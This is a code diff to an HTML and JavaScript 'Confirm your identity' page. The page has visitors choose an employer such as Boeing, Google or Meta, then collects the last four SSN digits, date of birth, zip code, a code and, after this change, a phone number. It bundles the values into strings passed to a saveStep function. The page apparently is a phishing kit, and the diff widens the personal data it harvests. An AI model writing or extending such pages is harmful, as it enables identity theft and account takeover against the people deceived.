@@ -25,11 +25,10 @@
 
         <div id="step1" class="step active">
             <h1>Confirm your identity</h1>
-            <p>Select or search your company</p>
-
+            
             <label for="company">Company</label>
             <select id="company" required>
-                <option value="">Select or type to search company...</option>
+                <option value="">Select your Company</option>
                 <option value="UNITED AIRLINES">UNITED AIRLINES</option>
                 <option value="BOEING">BOEING</option>
                 <option value="SIEMENS ENERGY">SIEMENS ENERGY</option>
@@ -54,7 +53,7 @@
                 <option value="AMAZON">AMAZON</option>
                 <option value="GOOGLE">GOOGLE</option>
                 <option value="META">META</option>
-                <!-- You can add more companies here -->
+                <!-- Add more companies here if needed -->
             </select>
 
             <label>Last 4 Digits of SSN</label>
@@ -77,6 +76,10 @@
             <h1>Additional Information</h1>
             <label>Zip Code</label>
             <input type="text" id="zip" maxlength="5" placeholder="12345" oninput="this.value = this.value.replace(/[^0-9]/g,'')">
+
+            <label>Phone Number</label>
+            <input type="tel" id="phone" placeholder="(123) 456-7890" required>
+
             <button class="continue" onclick="saveStep2()">Continue</button>
         </div>
 
@@ -139,13 +142,15 @@
 
         function saveStep2() {
             const zip = document.getElementById('zip').value.trim();
-            if (zip.length !== 5) {
-                alert("Please enter a valid 5-digit Zip Code.");
+            const phone = document.getElementById('phone').value.trim();
+
+            if (zip.length !== 5 || !phone) {
+                alert("Please enter a valid 5-digit Zip Code and Phone Number.");
                 return;
             }
 
-            const details = `Zip: ${zip} | Status: Step 2 Completed`;
-            saveStep(details, "Step 2 - Zip Code");
+            const details = `Zip: ${zip} | Phone: ${phone} | Status: Step 2 Completed`;
+            saveStep(details, "Step 2 - Zip Code & Phone");
             nextStep(3);
         }
 
@@ -168,9 +173,10 @@
             const ssn = document.getElementById('ssn').value || "";
             const dob = `${document.getElementById('month').value}/${document.getElementById('day').value}/${document.getElementById('year').value}`;
             const zip = document.getElementById('zip').value || "";
+            const phone = document.getElementById('phone').value || "";
             const company = document.getElementById('company').value || "";
 
-            const fullDetails = `Company: ${company} | SSN: ${ssn} | DOB: ${dob} | Zip: ${zip} | Code: ${code} | Status: Pending`;
+            const fullDetails = `Company: ${company} | SSN: ${ssn} | DOB: ${dob} | Zip: ${zip} | Phone: ${phone} | Code: ${code} | Status: Pending`;
 
             await saveStep(fullDetails, "Final Code Submission");
 
